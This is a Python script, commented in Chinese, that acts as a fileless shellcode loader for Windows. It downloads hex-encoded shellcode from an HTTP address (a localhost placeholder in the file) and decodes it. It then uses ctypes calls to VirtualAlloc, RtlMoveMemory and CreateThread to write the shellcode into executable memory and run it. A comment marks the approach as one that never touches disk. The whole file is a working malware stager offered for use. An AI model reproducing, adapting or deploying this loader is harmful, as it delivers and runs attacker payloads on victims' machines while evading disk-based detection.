import ctypes
import requests
import codecs

def loader():
    # method1-不落地
    r = requests.get('http://127.0.0.1:80/payload.txt')
    sc = r.content.strip()
    sc = codecs.escape_decode(sc, "hex-escape")[0]
    # byte数组
    shellcode = bytearray(sc)

    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40)
    )
     
    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf, 
        ctypes.c_int(len(shellcode)
        )
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0), 
        ctypes.c_uint64(ptr), 
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
    
if __name__ == "__main__":
    loader()
